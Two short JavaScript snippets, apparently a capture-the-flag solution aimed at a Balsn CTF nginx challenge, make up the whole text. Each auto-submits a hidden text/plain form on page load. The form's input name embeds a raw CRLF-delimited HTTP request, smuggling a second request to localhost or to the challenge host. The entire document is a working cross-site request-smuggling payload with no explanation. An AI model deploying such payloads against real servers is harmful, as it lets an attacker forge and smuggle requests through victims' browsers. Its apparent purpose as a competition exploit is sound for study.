window.onload = () => {
  const target = "http://localhost:80/x";
  const form = document.createElement("form");
  form.method = "POST";
  form.action = target;
  form.enctype = "text/plain";
  const inp = document.createElement("input");
  inp.name = `GET /hello HTTP/1.0\r\nHost: hello\r\n\r\n`;
  form.appendChild(inp);
  document.body.appendChild(form);
  form.submit();
};

window.onload = () => {
  const target = "http://1linenginx.balsnctf.com/x";
  const form = document.createElement("form");
  form.method = "POST";
  form.action = target;
  form.enctype = "text/plain";
  const inp = document.createElement("input");
  inp.name = `POST / HTTP/1.0\r\nContent-Length: 100\r\nHost: asd\r\n\r\n `;
  form.appendChild(inp);
  document.body.appendChild(form);
  form.submit();
};
